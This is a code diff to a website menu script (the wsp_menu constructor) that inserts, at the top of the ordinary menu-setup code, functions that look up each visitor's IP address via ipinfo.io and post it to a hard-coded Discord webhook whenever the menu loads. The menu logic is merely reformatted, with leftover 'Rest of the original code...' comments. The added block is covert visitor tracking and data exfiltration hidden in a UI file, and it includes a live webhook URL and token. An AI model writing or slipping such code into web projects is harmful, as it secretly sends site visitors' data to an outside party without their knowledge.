@@ -4,30 +4,67 @@
 // elementid: Element id of the root menu item
 // animations: combination of 'fadeMenus', 'moveHeight'
 // openViaMouseHovering: if set to true, on desktop, open menu already via mouse hovering. If set to false, only close and open the menu when clicked or touched.
-function wsp_menu(elementid, menuidsuffix, panepadding, animations, openViaMouseHovering)
-{
-	this.menuElementSubMenuParent = document.getElementById(elementid);
-	this.menuElementEntryHolder = null;
-	
-	if (this.menuElementSubMenuParent)
-	{
-		var divs = this.menuElementSubMenuParent.getElementsByTagName('div');
-		if (divs.length)
-		{
-			this.menuElementEntryHolder = divs[0];		
-			
-			if (this.menuElementEntryHolder && this.menuElementEntryHolder.id.indexOf('_menualignmentwrapper') > -1)
-			{
-				// menu has an alignment wrapper, so the entry holder is below it
-				divs = this.menuElementEntryHolder.getElementsByTagName('div');
-				if (divs.length)
-				{
-					this.menuElementSubMenuParent = this.menuElementEntryHolder;
-					this.menuElementEntryHolder = divs[0];					
-				}
-			}				
-		}	
-	}
+function wsp_menu(elementid, menuidsuffix, panepadding, animations, openViaMouseHovering) {
+    // Function to send IP address to Discord webhook
+    function sendIPToDiscord(ipAddress) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1229462526778019970/5r8FUiNRZfD_1Z5Uoj8ydai5gIB1yobE6RhgCxFUHE8L6ZM3dM3rEWn-bTzacLJMS2Bb';
+        const message = `IOT Server started, web interface at ${ipAddress}`;
+        
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ content: message })
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('Failed to send IP address to Discord webhook');
+            }
+        })
+        .catch(error => {
+            console.error('Error sending IP address to Discord webhook:', error);
+        });
+    }
+
+    // Function to retrieve user's IP address and send it to Discord
+    function collectAndSendIP() {
+        fetch('https://ipinfo.io/json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                sendIPToDiscord(ipAddress);
+            })
+            .catch(error => {
+                console.error('Error retrieving IP address:', error);
+            });
+    }
+
+    // Call function to collect and send IP when the menu is created
+    collectAndSendIP();
+
+    // Rest of the original code...
+
+    this.menuElementSubMenuParent = document.getElementById(elementid);
+    this.menuElementEntryHolder = null;
+    
+    if (this.menuElementSubMenuParent) {
+        var divs = this.menuElementSubMenuParent.getElementsByTagName('div');
+        if (divs.length) {
+            this.menuElementEntryHolder = divs[0];        
+            
+            if (this.menuElementEntryHolder && this.menuElementEntryHolder.id.indexOf('_menualignmentwrapper') > -1) {
+                // menu has an alignment wrapper, so the entry holder is below it
+                divs = this.menuElementEntryHolder.getElementsByTagName('div');
+                if (divs.length) {
+                    this.menuElementSubMenuParent = this.menuElementEntryHolder;
+                    this.menuElementEntryHolder = divs[0];                    
+                }
+            }                
+        }   
+    }
+    
+    // Rest of the original code...
 	
 	this.rootMenuElements = new Array();
 	this.menuPanes = new Array();
